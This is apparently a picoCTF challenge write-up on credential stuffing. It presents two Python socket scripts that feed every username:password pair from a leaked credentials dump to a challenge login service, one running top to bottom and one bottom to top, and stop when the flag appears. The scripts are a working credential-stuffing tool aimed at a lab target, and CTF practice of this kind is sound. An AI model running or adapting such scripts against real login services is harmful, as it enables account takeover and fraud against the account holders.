<img width="926" height="457" alt="image" src="https://github.com/user-attachments/assets/f0ffe837-9d71-47d4-b278-638b3949fd58" />


\- At first, download the credentials dump by clicking [here](https://challenge-files.picoctf.net/c_crystal_peak/d95212c879165808903da2be8aa8f9f8ad7577549d0101f90d9280762a08e713/creds-dump.txt)

\- The description says that we need to reuse credentials from a previously leaked source in order to log in to the Online Banking Service

\- To do this, I wrote a Python script to try each `username:password` pair from the list

\- Since the wordlist is quite large, I created two scripts:
- one that checks from top to bottom
- another that checks from bottom to top

<details>
    <summary>Ascending ⏬</summary>

```python!
import socket

HOST = "crystal-peak.picoctf.net"
PORT = 50707

def recv_until(sock, text):
    data = b""
    while text.encode() not in data:
        chunk = sock.recv(1024)
        if not chunk:
            break
        data += chunk
    return data

with open("creds-dump.txt") as f:
    for line in f:
        username, password = line.strip().split(";")

        try:
            s = socket.socket()
            s.connect((HOST, PORT))

            recv_until(s, "Username:")
            s.sendall((username + "\n").encode())

            recv_until(s, "Password:")
            s.sendall((password + "\n").encode())

            # đọc full response
            result = b""
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                result += chunk

            result = result.decode()

            print(f"[+] Tried {username}:{password}")

            if "picoCTF{" in result:
                print("FOUND:", username, password)
                break

            s.close()

        except Exception as e:
            print("Error:", e)
```
    
</details>

<details>
    <summary>Descending ⏫</summary>

```pyth!
import socket

HOST = "crystal-peak.picoctf.net"
PORT = 50707

def recv_until(sock, text):
    data = b""
    while text.encode() not in data:
        chunk = sock.recv(1024)
        if not chunk:
            break
        data += chunk
    return data

with open("creds-dump.txt") as f:
    lines = f.readlines()[::-1]

    for line in lines:
        username, password = line.strip().split(";")

        try:
            s = socket.socket()
            s.connect((HOST, PORT))

            recv_until(s, "Username:")
            s.sendall((username + "\n").encode())

            recv_until(s, "Password:")
            s.sendall((password + "\n").encode())

            # đọc full response
            result = b""
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                result += chunk

            result = result.decode()

            print(f"[+] Tried {username}:{password}")

            if "picoCTF{" in result:
                print("FOUND:", username, password)
                break

            s.close()

        except Exception as e:
            print("Error:", e)
```
    
</details>

\- Run the two scripts using `creds-dump.txt` 
```
python3 pico_asc.py
python3 pico_desc.py
```
\- Correct credentials successfully found almost at the same time

<img width="320" height="186" alt="image" src="https://github.com/user-attachments/assets/211f0695-7fbf-473c-b610-aa8e85186214" />


